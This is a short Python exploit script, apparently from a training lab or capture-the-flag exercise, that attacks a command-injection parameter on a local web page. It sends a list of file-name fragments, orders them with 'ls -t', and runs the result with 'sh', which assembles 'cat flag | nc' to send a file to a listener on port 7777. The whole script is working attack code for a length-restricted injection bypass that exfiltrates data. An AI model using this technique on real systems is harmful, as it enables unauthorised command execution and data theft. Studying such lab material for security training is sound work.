import requests
import time

baseurl = "http://192.168.245.128:18090/class09/2/index.php?cmd="
s = requests.session()

payload_list = [
    'ls -t>a',
    '>ca\\',
    '>t\ \\',
    '>fl\\',
    '>ag\\',
    '>\|n\\',
    '>c\ \\',
    '>192.\\',
    '>168.\\',
    '>245.\\',
    '>128\\',
    '>\ \\',
    '>7777'
]
payload_reverse = list(reversed(payload_list))
for i in range(0, len(payload_reverse)):
    url = baseurl + str(payload_reverse[i])
    print(url)
    s.get(url)
    time.sleep(0.1)

s.get(baseurl + 'sh a')
s.close()
